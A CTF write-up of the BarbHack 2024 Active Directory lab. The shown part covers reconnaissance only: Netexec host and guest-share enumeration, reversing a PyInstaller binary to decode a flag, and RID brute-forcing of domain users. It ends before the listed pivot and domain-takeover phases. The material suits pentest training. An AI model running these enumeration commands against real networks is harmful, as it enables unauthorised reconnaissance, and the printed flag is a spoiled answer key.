---
title: "Netexec Workshop - BarbHack CTF 2024"
date: 2024-08-10
draft: false
description: "Complete writeup of the Gotham City Active Directory lab exploitation during BarbHack CTF 2024"
summary: "Complete Active Directory lab exploitation with Netexec - Advanced pentesting techniques"
tags: ["ctf", "active-directory", "netexec", "pentest", "writeup"]
categories: ["CTF", "Active Directory"]
featuredImage: "featured.png"
images: ["featured.png"]
---

# Netexec Workshop - BarbHack CTF 2024
## Gotham City Active Directory Lab

---

## Table of Contents
- [Overview](#overview)
- [Phase 1: Initial Reconnaissance](#phase-1-initial-reconnaissance)
- [Phase 2: SRV01 Exploitation](#phase-2-srv01-exploitation)
- [Phase 3: Pivot to SRV02](#phase-3-pivot-to-srv02)
- [Phase 4: Domain Domination](#phase-4-domain-domination)
- [Conclusion](#conclusion)

---

## Overview

This writeup details the complete exploitation of an Active Directory lab during the **BarbHack CTF 2024**. The objective was to achieve domain domination by exploiting several vulnerabilities and advanced Active Directory techniques.

**Final Objective:** Obtain administrative access to the domain controller (DC01)

**Main Tools:** Netexec (nxc), Evil-WinRM, BloodyAD, Impacket

---

## Phase 1: Initial Reconnaissance

### Host Discovery

Starting by identifying all hosts on the network. A simple network scan maps out the target environment.

**Command used:**
```bash
exegol@workspace$ nxc smb 192.168.56.0/24
SMB         192.168.56.12   445    SRV02            [*] Windows Server 2022 Build 20348 x64 (name:SRV02) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False)
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:GOTHAM.CITY) (signing:True) (SMBv1:False)
```


**What we discovered:**
- **DC01** (192.168.56.10): Domain controller for GOTHAM.CITY
- **SRV01** (192.168.56.11): Domain member server
- **SRV02** (192.168.56.12): Domain member server

This gives us a clear picture of the network topology. The domain controller is the crown jewel, but we'll need to work our way through the member servers first.

Then adding everything to the hosts file:
```shell
exegol@workspace$ nxc smb 192.168.56.0/24 --generate-hosts-file hosts     

exegol@workspace$ cat hosts                                                  
192.168.56.12     SRV02.GOTHAM.CITY SRV02
192.168.56.11     SRV01.GOTHAM.CITY SRV01
192.168.56.10     DC01.GOTHAM.CITY GOTHAM.CITY DC01
```

### SMB Share Enumeration

Next, checking what shares are accessible anonymously. Sometimes something interesting turns up right off the bat.

**Command used:**
```bash
exegol@workspace$ nxc smb 192.168.56.0/24 -u 'Guest' -p '' --shares
SMB         192.168.56.12   445    SRV02            [*] Windows Server 2022 Build 20348 x64 (name:SRV02) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False)
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:GOTHAM.CITY) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    SRV02            [+] GOTHAM.CITY\Guest:
SMB         192.168.56.11   445    SRV01            [+] GOTHAM.CITY\Guest:
SMB         192.168.56.12   445    SRV02            [*] Enumerated shares
SMB         192.168.56.12   445    SRV02            Share           Permissions     Remark
SMB         192.168.56.12   445    SRV02            -----           -----------     ------
SMB         192.168.56.12   445    SRV02            ADMIN$                          Remote Admin
SMB         192.168.56.12   445    SRV02            C$                              Default share
SMB         192.168.56.12   445    SRV02            IPC$            READ            Remote IPC
SMB         192.168.56.10   445    DC01             [+] GOTHAM.CITY\Guest:
SMB         192.168.56.11   445    SRV01            [*] Enumerated shares
SMB         192.168.56.11   445    SRV01            Share           Permissions     Remark
SMB         192.168.56.11   445    SRV01            -----           -----------     ------
SMB         192.168.56.11   445    SRV01            ADMIN$                          Remote Admin
SMB         192.168.56.11   445    SRV01            C$                              Default share
SMB         192.168.56.11   445    SRV01            CleanSlate      READ,WRITE      Basic RW share for all
SMB         192.168.56.11   445    SRV01            IPC$            READ            Remote IPC
SMB         192.168.56.10   445    DC01             [*] Enumerated shares
SMB         192.168.56.10   445    DC01             Share           Permissions     Remark
SMB         192.168.56.10   445    DC01             -----           -----------     ------
SMB         192.168.56.10   445    DC01             ADMIN$                          Remote Admin
SMB         192.168.56.10   445    DC01             C$                              Default share
SMB         192.168.56.10   445    DC01             IPC$            READ            Remote IPC
SMB         192.168.56.10   445    DC01             NETLOGON                        Logon server share
SMB         192.168.56.10   445    DC01             SYSVOL                          Logon server share
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

**Interesting discovery:** The `CleanSlate` share on SRV01 with read/write access! This is unusual and definitely worth investigating.

### CleanSlate Executable Analysis

A suspicious executable file is found. Downloading it for analysis.

**Download command:**
```bash
exegol@workspace$ smbclient \\\\192.168.56.11\\CleanSlate -U 'Guest'
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Aug 10 14:45:14 2025
  ..                                DHS        0  Sun Aug 10 14:20:39 2025
  cleanslate.exe                      A 10510609  Sun Aug 10 14:20:26 2025

		15638527 blocks of size 4096. 12377195 blocks available
smb: \> get cleanslate.exe
getting file \cleanslate.exe of size 10510609 as cleanslate.exe (540221.8 KiloBytes/sec) (average 540224.6 KiloBytes/sec)
smb: \>
```

Time to look at the binary internals.

```bash
cat cleanslate.exe
```

The binary output shows various Python-related strings and DLL files, indicating this is a PyInstaller-packaged Python application.

Python catches the eye, so digging further into this rabbit hole:

```bash
exegol@workspace$ cat cleanslate.exe | grep python
grep: (standard input): binary file matches
exegol@workspace$ strings cleanslate.exe | grep python
pyi-python-flag
Failed to pre-initialize embedded python interpreter!
Failed to allocate PyConfig structure! Unsupported python version?
Failed to set python home path!
Failed to start embedded python interpreter!
pygments.lexers.python)
bpython311.dll
7python311.dll
```

Not being the strongest at low-level reversing, a quick GPT query provides useful guidance:
```
Decompiling the Source Code:

Use pyinstaller-extractor to recover the original Python scripts.
Audit the decompiled source code, focusing on:
Plaintext Secrets: Passwords, API keys, connection strings, certificates.
File Paths: References to configuration files, logs, or network resources.
System Commands: Calls to os.system(), subprocess.Popen(), or similar libraries.
Application Logic: Discover the program's actual function. Is its name misleading?
```

Following those steps:


```bash
exegol@workspace$ python3 pyinstxtractor.py cleanslate.exe
[+] Processing cleanslate.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 3.11
[+] Length of package: 10172177 bytes
[+] Found 26 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: cleanslate.pyc
[+] Found 604 files in PYZ archive
[+] Successfully extracted pyinstaller archive: cleanslate.exe

You can now use a python decompiler on the pyc files within the extracted directory
exegol@workspace$ ls
cleanslate.exe  cleanslate.exe_extracted  LICENSE  pyinstxtractor.py  README.md
exegol@workspace$ cd cleanslate.exe_extracted
exegol@workspace$ ls
base_library.zip  _ctypes.pyd   libcrypto-3.dll  _lzma.pyd                pyimod02_importers.pyc  pyi_rth_inspect.pyc  PYZ-00.pyz            _socket.pyd  unicodedata.pyd
_bz2.pyd          _decimal.pyd  libffi-8.dll     pyiboot01_bootstrap.pyc  pyimod03_ctypes.pyc     pyi_rth_pkgutil.pyc  PYZ-00.pyz_extracted  _ssl.pyd     VCRUNTIME140.dll
cleanslate.pyc    _hashlib.pyd  libssl-3.dll     pyimod01_archive.pyc     pyimod04_pywin32.pyc    python311.dll        select.pyd            struct.pyc
```

This is not the complete source code directly, but internal components of the PyInstaller packager. The file we are most interested in is cleanslate.pyc.
The best tool to use for this type of decompilation is pycdc. Unlike uncompyle6, it is actively maintained and often performs better for recent versions of Python.
Here is the installation process:
```shell
git clone https://github.com/zrax/pycdc.git
cd pycdc
cmake .
make
```

Full disassembly output (lengthy but useful for analysis):

```shell
exegol@workspace$ ./pycdc/pycdas cleanslate.pyc
cleanslate.pyc (Python 3.11)
[Code]
    File Name: cleanslate.py
    Object Name: <module>
    Qualified Name: <module>
    Arg Count: 0
    Pos Only Arg Count: 0
    KW Only Arg Count: 0
    Stack Size: 2
    Flags: 0x00000000
    [Names]
        'rich.progress'
        'Progress'
        'time'
        'os'
        'base64'
        'shift_char'
        'KEY_FILE'
        'KEY'
        'is_valid_key'
        'cleaning'
        'main'
        '__name__'
    [Locals+Names]
    [Constants]
        0
        (
            'Progress'
        )
        None
        [Code]
            File Name: cleanslate.py
            Object Name: shift_char
            Qualified Name: shift_char
            Arg Count: 2
            Pos Only Arg Count: 0
            KW Only Arg Count: 0
            Stack Size: 6
            Flags: 0x00000003 (CO_OPTIMIZED | CO_NEWLOCALS)
            [Names]
                'isalpha'
                'isupper'
                'chr'
                'ord'
                'isdigit'
            [Locals+Names]
                'c'
                'shift'
                'shift_amount'
                'base'
            [Constants]
                'Shift character by shift amount.'
                26
                'A'
                'a'
                10
                '0'
            [Disassembly]
                0       RESUME                          0
                2       LOAD_FAST                       0: c
                4       LOAD_METHOD                     0: isalpha
                26      PRECALL                         0
                30      CALL                            0
                40      POP_JUMP_FORWARD_IF_FALSE       95 (to 232)
                42      LOAD_FAST                       1: shift
                44      LOAD_CONST                      1: 26
                46      BINARY_OP                       6 (%)
                50      STORE_FAST                      2: shift_amount
                52      LOAD_FAST                       0: c
                54      LOAD_METHOD                     1: isupper
                76      PRECALL                         0
                80      CALL                            0
                90      POP_JUMP_FORWARD_IF_FALSE       2 (to 96)
                92      LOAD_CONST                      2: 'A'
                94      JUMP_FORWARD                    1 (to 98)
                96      LOAD_CONST                      3: 'a'
                98      STORE_FAST                      3: base
                100     LOAD_GLOBAL                     5: NULL + chr
                112     LOAD_GLOBAL                     7: NULL + ord
                124     LOAD_FAST                       0: c
                126     PRECALL                         1
                130     CALL                            1
                140     LOAD_GLOBAL                     7: NULL + ord
                152     LOAD_FAST                       3: base
                154     PRECALL                         1
                158     CALL                            1
                168     BINARY_OP                       10 (-)
                172     LOAD_FAST                       2: shift_amount
                174     BINARY_OP                       0 (+)
                178     LOAD_CONST                      1: 26
                180     BINARY_OP                       6 (%)
                184     LOAD_GLOBAL                     7: NULL + ord
                196     LOAD_FAST                       3: base
                198     PRECALL                         1
                202     CALL                            1
                212     BINARY_OP                       0 (+)
                216     PRECALL                         1
                220     CALL                            1
                230     RETURN_VALUE                    
                232     LOAD_FAST                       0: c
                234     LOAD_METHOD                     4: isdigit
                256     PRECALL                         0
                260     CALL                            0
                270     POP_JUMP_FORWARD_IF_FALSE       71 (to 414)
                272     LOAD_FAST                       1: shift
                274     LOAD_CONST                      4: 10
                276     BINARY_OP                       6 (%)
                280     STORE_FAST                      2: shift_amount
                282     LOAD_GLOBAL                     5: NULL + chr
                294     LOAD_GLOBAL                     7: NULL + ord
                306     LOAD_FAST                       0: c
                308     PRECALL                         1
                312     CALL                            1
                322     LOAD_GLOBAL                     7: NULL + ord
                334     LOAD_CONST                      5: '0'
                336     PRECALL                         1
                340     CALL                            1
                350     BINARY_OP                       10 (-)
                354     LOAD_FAST                       2: shift_amount
                356     BINARY_OP                       0 (+)
                360     LOAD_CONST                      4: 10
                362     BINARY_OP                       6 (%)
                366     LOAD_GLOBAL                     7: NULL + ord
                378     LOAD_CONST                      5: '0'
                380     PRECALL                         1
                384     CALL                            1
                394     BINARY_OP                       0 (+)
                398     PRECALL                         1
                402     CALL                            1
                412     RETURN_VALUE                    
                414     LOAD_FAST                       0: c
                416     RETURN_VALUE                    
        'C:\\SHARE\\key.txt'
        'fTk1NmRkMDQ2MDBpNjdnZDU0Z2dlMjdoNDNlZjJlNzFme2V1ZQ=='
        [Code]
            File Name: cleanslate.py
            Object Name: is_valid_key
            Qualified Name: is_valid_key
            Arg Count: 1
            Pos Only Arg Count: 0
            KW Only Arg Count: 0
            Stack Size: 6
            Flags: 0x00000003 (CO_OPTIMIZED | CO_NEWLOCALS)
            [Names]
                'os'
                'path'
                'exists'
                'KEY_FILE'
                'open'
                'read'
                'strip'
                'len'
            [Locals+Names]
                'input_key'
                'file'
                'stored_key'
            [Constants]
                None
                'r'
                True
                24
                'GOTHAMCITY'
                False
            [Disassembly]
                0       RESUME                          0
                2       LOAD_GLOBAL                     0: os
                14      LOAD_ATTR                       1: path
                24      LOAD_METHOD                     2: exists
                46      LOAD_GLOBAL                     6: KEY_FILE
                58      PRECALL                         1
                62      CALL                            1
                72      POP_JUMP_FORWARD_IF_FALSE       116 (to 306)
                74      LOAD_GLOBAL                     9: NULL + open
                86      LOAD_GLOBAL                     6: KEY_FILE
                98      LOAD_CONST                      1: 'r'
                100     PRECALL                         2
                104     CALL                            2
                114     BEFORE_WITH                     
                116     STORE_FAST                      1: file
                118     LOAD_FAST                       1: file
                120     LOAD_METHOD                     5: read
                142     PRECALL                         0
                146     CALL                            0
                156     LOAD_METHOD                     6: strip
                178     PRECALL                         0
                182     CALL                            0
                192     STORE_FAST                      2: stored_key
                194     LOAD_CONST                      0: None
                196     LOAD_CONST                      0: None
                198     LOAD_CONST                      0: None
                200     PRECALL                         2
                204     CALL                            2
                214     POP_TOP                         
                216     JUMP_FORWARD                    11 (to 240)
                218     PUSH_EXC_INFO                   
                220     WITH_EXCEPT_START               
                222     POP_JUMP_FORWARD_IF_TRUE        4 (to 232)
                224     RERAISE                         2
                226     COPY                            3
                228     POP_EXCEPT                      
                230     RERAISE                         1
                232     POP_TOP                         
                234     POP_EXCEPT                      
                236     POP_TOP                         
                238     POP_TOP                         
                240     LOAD_FAST                       0: input_key
                242     LOAD_FAST                       2: stored_key
                244     COMPARE_OP                      2 (==)
                250     POP_JUMP_FORWARD_IF_FALSE       2 (to 256)
                252     LOAD_CONST                      2: True
                254     RETURN_VALUE                    
                256     LOAD_GLOBAL                     15: NULL + len
                268     LOAD_FAST                       0: input_key
                270     PRECALL                         1
                274     CALL                            1
                284     LOAD_CONST                      3: 24
                286     COMPARE_OP                      2 (==)
                292     POP_JUMP_FORWARD_IF_FALSE       6 (to 306)
                294     LOAD_CONST                      4: 'GOTHAMCITY'
                296     LOAD_FAST                       0: input_key
                298     CONTAINS_OP                     0 (in)
                300     POP_JUMP_FORWARD_IF_FALSE       2 (to 306)
                302     LOAD_CONST                      2: True
                304     RETURN_VALUE                    
                306     LOAD_CONST                      5: False
                308     RETURN_VALUE                    
        [Code]
            File Name: cleanslate.py
            Object Name: cleaning
            Qualified Name: cleaning
            Arg Count: 1
            Pos Only Arg Count: 0
            KW Only Arg Count: 0
            Stack Size: 4
            Flags: 0x00000003 (CO_OPTIMIZED | CO_NEWLOCALS)
            [Names]
                'base64'
                'b64decode'
                'decode'
                'join'
            [Locals+Names]
                'encoded_flag'
                'decoded_bytes'
                'decoded_flag'
                'reversed_shifted_flag'
                'original_flag'
                'shift'
            [Constants]
                None
                3
                ''
                [Code]
                    File Name: cleanslate.py
                    Object Name: <genexpr>
                    Qualified Name: cleaning.<locals>.<genexpr>
                    Arg Count: 1
                    Pos Only Arg Count: 0
                    KW Only Arg Count: 0
                    Stack Size: 5
                    Flags: 0x00000033 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NESTED | CO_GENERATOR)
                    [Names]
                        'shift_char'
                    [Locals+Names]
                        '.0'
                        'c'
                        'shift'
                    [Constants]
                        None
                    [Disassembly]
                        0       COPY_FREE_VARS                  1
                        2       RETURN_GENERATOR                
                        4       POP_TOP                         
                        6       RESUME                          0
                        8       LOAD_FAST                       0: .0
                        10      FOR_ITER                        21 (to 54)
                        12      STORE_FAST                      1: c
                        14      LOAD_GLOBAL                     1: NULL + shift_char
                        26      LOAD_FAST                       1: c
                        28      LOAD_DEREF                      2: shift
                        30      UNARY_NEGATIVE                  
                        32      PRECALL                         2
                        36      CALL                            2
                        46      YIELD_VALUE                     
                        48      RESUME                          1
                        50      POP_TOP                         
                        52      JUMP_BACKWARD                   22 (to 10)
                        54      LOAD_CONST                      0: None
                        56      RETURN_VALUE                    
                -1
            [Disassembly]
                0       MAKE_CELL                       5: shift
                2       RESUME                          0
                4       LOAD_GLOBAL                     1: NULL + base64
                16      LOAD_ATTR                       1: b64decode
                26      LOAD_FAST                       0: encoded_flag
                28      PRECALL                         1
                32      CALL                            1
                42      STORE_FAST                      1: decoded_bytes
                44      LOAD_FAST                       1: decoded_bytes
                46      LOAD_METHOD                     2: decode
                68      PRECALL                         0
                72      CALL                            0
                82      STORE_FAST                      2: decoded_flag
                84      LOAD_CONST                      1: 3
                86      STORE_DEREF                     5: shift
                88      LOAD_CONST                      2: ''
                90      LOAD_METHOD                     3: join
                112     LOAD_CLOSURE                    5: shift
                114     BUILD_TUPLE                     1
                116     LOAD_CONST                      3: <CODE> <genexpr>
                118     MAKE_FUNCTION                   8
                120     LOAD_FAST                       2: decoded_flag
                122     GET_ITER                        
                124     PRECALL                         0
                128     CALL                            0
                138     PRECALL                         1
                142     CALL                            1
                152     STORE_FAST                      3: reversed_shifted_flag
                154     LOAD_FAST                       3: reversed_shifted_flag
                156     LOAD_CONST                      0: None
                158     LOAD_CONST                      0: None
                160     LOAD_CONST                      4: -1
                162     BUILD_SLICE                     3
                164     BINARY_SUBSCR                   
                174     STORE_FAST                      4: original_flag
                176     LOAD_FAST                       4: original_flag
                178     RETURN_VALUE                    
        [Code]
            File Name: cleanslate.py
            Object Name: main
            Qualified Name: main
            Arg Count: 0
            Pos Only Arg Count: 0
            KW Only Arg Count: 0
            Stack Size: 6
            Flags: 0x00000003 (CO_OPTIMIZED | CO_NEWLOCALS)
            [Names]
                'input'
                'is_valid_key'
                'print'
                'Progress'
                'add_task'
                'range'
                'time'
                'sleep'
                'update'
                'cleaning'
                'KEY'
            [Locals+Names]
                'key'
                'progress'
                'task'
                'i'
            [Constants]
                None
                'Enter your key: '
                'Key is valid! Cleaning data...'
                '[green]Processing...'
                100
                (
                    'total'
                )
                0.05
                1
                (
                    'advance'
                )
                'Process completed! Flag:'
                'Invalid key. Please try again.'
            [Disassembly]
                0       RESUME                          0
                2       LOAD_GLOBAL                     1: NULL + input
                14      LOAD_CONST                      1: 'Enter your key: '
                16      PRECALL                         1
                20      CALL                            1
                30      STORE_FAST                      0: key
                32      LOAD_GLOBAL                     3: NULL + is_valid_key
                44      LOAD_FAST                       0: key
                46      PRECALL                         1
                50      CALL                            1
                60      POP_JUMP_FORWARD_IF_FALSE       174 (to 410)
                62      LOAD_GLOBAL                     5: NULL + print
                74      LOAD_CONST                      2: 'Key is valid! Cleaning data...'
                76      PRECALL                         1
                80      CALL                            1
                90      POP_TOP                         
                92      LOAD_GLOBAL                     7: NULL + Progress
                104     PRECALL                         0
                108     CALL                            0
                118     BEFORE_WITH                     
                120     STORE_FAST                      1: progress
                122     LOAD_FAST                       1: progress
                124     LOAD_METHOD                     4: add_task
                146     LOAD_CONST                      3: '[green]Processing...'
                148     LOAD_CONST                      4: 100
                150     KW_NAMES                        5: ('total',)
                152     PRECALL                         2
                156     CALL                            2
                166     STORE_FAST                      2: task
                168     LOAD_GLOBAL                     11: NULL + range
                180     LOAD_CONST                      4: 100
                182     PRECALL                         1
                186     CALL                            1
                196     GET_ITER                        
                198     FOR_ITER                        45 (to 290)
                200     STORE_FAST                      3: i
                202     LOAD_GLOBAL                     13: NULL + time
                214     LOAD_ATTR                       7: sleep
                224     LOAD_CONST                      6: 0.05
                226     PRECALL                         1
                230     CALL                            1
                240     POP_TOP                         
                242     LOAD_FAST                       1: progress
                244     LOAD_METHOD                     8: update
                266     LOAD_FAST                       2: task
                268     LOAD_CONST                      7: 1
                270     KW_NAMES                        8: ('advance',)
                272     PRECALL                         2
                276     CALL                            2
                286     POP_TOP                         
                288     JUMP_BACKWARD                   46 (to 198)
                290     NOP                             
                292     LOAD_CONST                      0: None
                294     LOAD_CONST                      0: None
                296     LOAD_CONST                      0: None
                298     PRECALL                         2
                302     CALL                            2
                312     POP_TOP                         
                314     JUMP_FORWARD                    11 (to 338)
                316     PUSH_EXC_INFO                   
                318     WITH_EXCEPT_START               
                320     POP_JUMP_FORWARD_IF_TRUE        4 (to 330)
                322     RERAISE                         2
                324     COPY                            3
                326     POP_EXCEPT                      
                328     RERAISE                         1
                330     POP_TOP                         
                332     POP_EXCEPT                      
                334     POP_TOP                         
                336     POP_TOP                         
                338     LOAD_GLOBAL                     5: NULL + print
                350     LOAD_CONST                      9: 'Process completed! Flag:'
                352     LOAD_GLOBAL                     19: NULL + cleaning
                364     LOAD_GLOBAL                     20: KEY
                376     PRECALL                         1
                380     CALL                            1
                390     PRECALL                         2
                394     CALL                            2
                404     POP_TOP                         
                406     LOAD_CONST                      0: None
                408     RETURN_VALUE                    
                410     LOAD_GLOBAL                     5: NULL + print
                422     LOAD_CONST                      10: 'Invalid key. Please try again.'
                424     PRECALL                         1
                428     CALL                            1
                438     POP_TOP                         
                440     LOAD_CONST                      0: None
                442     RETURN_VALUE                    
        '__main__'
    [Disassembly]
        0       RESUME                          0
        2       LOAD_CONST                      0: 0
        4       LOAD_CONST                      1: ('Progress',)
        6       IMPORT_NAME                     0: rich.progress
        8       IMPORT_FROM                     1: Progress
        10      STORE_NAME                      1: Progress
        12      POP_TOP                         
        14      LOAD_CONST                      0: 0
        16      LOAD_CONST                      2: None
        18      IMPORT_NAME                     2: time
        20      STORE_NAME                      2: time
        22      LOAD_CONST                      0: 0
        24      LOAD_CONST                      2: None
        26      IMPORT_NAME                     3: os
        28      STORE_NAME                      3: os
        30      LOAD_CONST                      0: 0
        32      LOAD_CONST                      2: None
        34      IMPORT_NAME                     4: base64
        36      STORE_NAME                      4: base64
        38      LOAD_CONST                      3: <CODE> shift_char
        40      MAKE_FUNCTION                   0
        42      STORE_NAME                      5: shift_char
        44      LOAD_CONST                      4: 'C:\\SHARE\\key.txt'
        46      STORE_NAME                      6: KEY_FILE
        48      LOAD_CONST                      5: 'fTk1NmRkMDQ2MDBpNjdnZDU0Z2dlMjdoNDNlZjJlNzFme2V1ZQ=='
        50      STORE_NAME                      7: KEY
        52      LOAD_CONST                      6: <CODE> is_valid_key
        54      MAKE_FUNCTION                   0
        56      STORE_NAME                      8: is_valid_key
        58      LOAD_CONST                      7: <CODE> cleaning
        60      MAKE_FUNCTION                   0
        62      STORE_NAME                      9: cleaning
        64      LOAD_CONST                      8: <CODE> main
        66      MAKE_FUNCTION                   0
        68      STORE_NAME                      10: main
        70      LOAD_NAME                       11: __name__
        72      LOAD_CONST                      9: '__main__'
        74      COMPARE_OP                      2 (==)
        80      POP_JUMP_FORWARD_IF_FALSE       12 (to 106)
        82      PUSH_NULL                       
        84      LOAD_NAME                       10: main
        86      PRECALL                         0
        90      CALL                            0
        100     POP_TOP                         
        102     LOAD_CONST                      2: None
        104     RETURN_VALUE                    
        106     LOAD_CONST                      2: None
        108     RETURN_VALUE                    
```

After a quick look, the decoding process breaks down into 3 steps:

Decode the string fTk1NmRkMDQ2MDBpNjdnZDU0Z2dlMjdoNDNlZjJlNzFme2V1ZQ== from Base64.

Apply a character shift (inverse Caesar cipher) of 3.

Reverse the resulting string.

```python
import base64
import sys

def shift_char(c, shift):
    if c.isalpha():
        base = 'A' if c.isupper() else 'a'
        return chr((ord(c) - ord(base) + shift) % 26 + ord(base))
    elif c.isdigit():
        base = '0'
        return chr((ord(c) - ord(base) + shift) % 10 + ord(base))
    return c

def cleaning(encoded_flag):
    decoded_bytes = base64.b64decode(encoded_flag)
    decoded_flag = decoded_bytes.decode('utf-8')
    shift = 3
    reversed_shifted_flag = "".join(shift_char(c, -shift) for c in decoded_flag)
    original_flag = reversed_shifted_flag[::-1]
    return original_flag

KEY = 'fTk1NmRkMDQ2MDBpNjdnZDU0Z2dlMjdoNDNlZjJlNzFme2V1ZQ=='
flag = cleaning(KEY)

print(f"Le flag est: {flag}")
```

```bash
exegol@workspace$ python3 decode.py
Le flag est: brb{c84b9cb01e49bdd12ad43f77317aa326}
```

First flag captured!

### User Enumeration

Time to see what users exist in this domain. We'll use RID brute forcing to discover accounts that might not be immediately visible.

```shell
exegol@workspace$ nxc smb 192.168.56.0/24 -u 'Guest' -p '' --rid-brute     
SMB         192.168.56.11   445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False) 
SMB         192.168.56.12   445    SRV02            [*] Windows Server 2022 Build 20348 x64 (name:SRV02) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False) 
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:GOTHAM.CITY) (signing:True) (SMBv1:False) 
SMB         192.168.56.11   445    SRV01            [+] GOTHAM.CITY\Guest: 
SMB         192.168.56.12   445    SRV02            [+] GOTHAM.CITY\Guest: 
SMB         192.168.56.10   445    DC01             [+] GOTHAM.CITY\Guest: 
SMB         192.168.56.11   445    SRV01            500: SRV01\Administrator (SidTypeUser)
SMB         192.168.56.11   445    SRV01            501: SRV01\Guest (SidTypeUser)
SMB         192.168.56.11   445    SRV01            503: SRV01\DefaultAccount (SidTypeUser)
SMB         192.168.56.11   445    SRV01            504: SRV01\WDAGUtilityAccount (SidTypeUser)
SMB         192.168.56.11   445    SRV01            513: SRV01\None (SidTypeGroup)
SMB         192.168.56.11   445    SRV01            1000: SRV01\vagrant (SidTypeUser)
SMB         192.168.56.12   445    SRV02            500: SRV02\Administrator (SidTypeUser)
SMB         192.168.56.12   445    SRV02            501: SRV02\Guest (SidTypeUser)
SMB         192.168.56.12   445    SRV02            503: SRV02\DefaultAccount (SidTypeUser)
SMB         192.168.56.12   445    SRV02            504: SRV02\WDAGUtilityAccount (SidTypeUser)
SMB         192.168.56.12   445    SRV02            513: SRV02\None (SidTypeGroup)
SMB         192.168.56.12   445    SRV02            1000: SRV02\vagrant (SidTypeUser)
SMB         192.168.56.10   445    DC01             498: GOTHAM\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         192.168.56.10   445    DC01             500: GOTHAM\Administrator (SidTypeUser)
SMB         192.168.56.10   445    DC01             501: GOTHAM\Guest (SidTypeUser)
SMB         192.168.56.10   445    DC01             502: GOTHAM\krbtgt (SidTypeUser)
SMB         192.168.56.10   445    DC01             512: GOTHAM\Domain Admins (SidTypeGroup)
SMB         192.168.56.10   445    DC01             513: GOTHAM\Domain Users (SidTypeGroup)
SMB         192.168.56.10   445    DC01             514: GOTHAM\Domain Guests (SidTypeGroup)
SMB         192.168.56.10   445    DC01             515: GOTHAM\Domain Computers (SidTypeGroup)
SMB         192.168.56.10   445    DC01             516: GOTHAM\Domain Controllers (SidTypeGroup)
SMB         192.168.56.10   445    DC01             517: GOTHAM\Cert Publishers (SidTypeAlias)
SMB         192.168.56.10   445    DC01             518: GOTHAM\Schema Admins (SidTypeGroup)
SMB         192.168.56.10   445    DC01             519: GOTHAM\Enterprise Admins (SidTypeGroup)
SMB         192.168.56.10   445    DC01             520: GOTHAM\Group Policy Creator Owners (SidTypeGroup)
SMB         192.168.56.10   445    DC01             521: GOTHAM\Read-only Domain Controllers (SidTypeGroup)
SMB         192.168.56.10   445    DC01             522: GOTHAM\Cloneable Domain Controllers (SidTypeGroup)
SMB         192.168.56.10   445    DC01             525: GOTHAM\Protected Users (SidTypeGroup)
SMB         192.168.56.10   445    DC01             526: GOTHAM\Key Admins (SidTypeGroup)
SMB         192.168.56.10   445    DC01             527: GOTHAM\Enterprise Key Admins (SidTypeGroup)
SMB         192.168.56.10   445    DC01             553: GOTHAM\RAS and IAS Servers (SidTypeAlias)
SMB         192.168.56.10   445    DC01             571: GOTHAM\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         192.168.56.10   445    DC01             572: GOTHAM\Denied RODC Password Replication Group (SidTypeAlias)
SMB         192.168.56.10   445    DC01             1000: GOTHAM\vagrant (SidTypeUser)
SMB         192.168.56.10   445    DC01             1001: GOTHAM\DC01$ (SidTypeUser)
SMB         192.168.56.10   445    DC01             1102: GOTHAM\DnsAdmins (SidTypeAlias)
SMB         192.168.56.10   445    DC01             1103: GOTHAM\DnsUpdateProxy (SidTypeGroup)
SMB         192.168.56.10   445    DC01             1104: GOTHAM\SRV02$ (SidTypeUser)
SMB         192.168.56.10   445    DC01             1105: GOTHAM\SRV01$ (SidTypeUser)
SMB         192.168.56.10   445    DC01             1106: GOTHAM\bruce.wayne (SidTypeUser)
SMB         192.168.56.10   445    DC01             1107: GOTHAM\joker (SidTypeUser)
SMB         192.168.56.10   445    DC01             1108: GOTHAM\alfred.pennyworth (SidTypeUser)
SMB         192.168.56.10   445    DC01             1109: GOTHAM\selina.kyle (SidTypeUser)
SMB         192.168.56.10   445    DC01             1110: GOTHAM\harvey.dent (SidTypeUser)
SMB         192.168.56.10   445    DC01             1111: GOTHAM\jim.gordon (SidTypeUser)
SMB         192.168.56.10   445    DC01             1112: GOTHAM\lucius.fox1337 (SidTypeUser)
SMB         192.168.56.10   445    DC01             1113: GOTHAM\barbara.gordon (SidTypeUser)
SMB         192.168.56.10   445    DC01             1114: GOTHAM\oswald.cobblepot (SidTypeUser)
SMB         192.168.56.10   445    DC01             1115: GOTHAM\edward.nygma (SidTypeUser)
SMB         192.168.56.10   445    DC01             1116: GOTHAM\bane (SidTypeUser)
SMB         192.168.56.10   445    DC01             1117: GOTHAM\victor.freeze (SidTypeUser)
SMB         192.168.56.10   445    DC01             1118: GOTHAM\harley.quinn (SidTypeUser)
SMB         192.168.56.10   445    DC01             1119: GOTHAM\dick.grayson (SidTypeUser)
SMB         192.168.56.10   445    DC01             1120: GOTHAM\jason.todd (SidTypeUser)
SMB         192.168.56.10   445    DC01             1121: GOTHAM\tim.drake (SidTypeUser)
